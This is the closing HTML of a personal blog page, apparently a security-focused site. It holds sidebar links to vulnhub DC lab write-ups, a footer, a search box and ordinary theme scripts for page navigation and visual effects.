alt="vulnhub-DC-5"/></a><div class="content"><a class="title" href="/2024/11/20/vulnhub-DC-5/" title="vulnhub-DC-5">vulnhub-DC-5</a><time datetime="2024-11-20T13:04:36.000Z" title="发表于 2024-11-20 21:04:36">2024-11-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/20/vulnhub-DC-4/" title="vulnhub-DC-4"><img src="/img/background.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vulnhub-DC-4"/></a><div class="content"><a class="title" href="/2024/11/20/vulnhub-DC-4/" title="vulnhub-DC-4">vulnhub-DC-4</a><time datetime="2024-11-20T09:49:17.000Z" title="发表于 2024-11-20 17:49:17">2024-11-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/14/vulnhub-DC-3/" title="vulnhub-DC-3"><img src="/img/background.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vulnhub-DC-3"/></a><div class="content"><a class="title" href="/2024/11/14/vulnhub-DC-3/" title="vulnhub-DC-3">vulnhub-DC-3</a><time datetime="2024-11-14T12:23:01.000Z" title="发表于 2024-11-14 20:23:01">2024-11-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/13/vulnhub-DC-2/" title="vulnhub-DC-2"><img src="/img/background.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vulnhub-DC-2"/></a><div class="content"><a class="title" href="/2024/11/13/vulnhub-DC-2/" title="vulnhub-DC-2">vulnhub-DC-2</a><time datetime="2024-11-13T12:41:23.000Z" title="发表于 2024-11-13 20:41:23">2024-11-13</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/background.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2024 By Six_plum</div><div class="footer_custom_text">I wish you to become your own sun, no need to rely on who's light.</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="true"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"]):not([href="/music/"]):not([href="/no-pjax/"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- 樱花特效 启用时删去下面的<!即可-->
+<!<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/yremp/yremp-js@1.5/sakura.js"><!</script></body></html><!<script type="text/javascript" src="\js\sakura.js"><!</script>
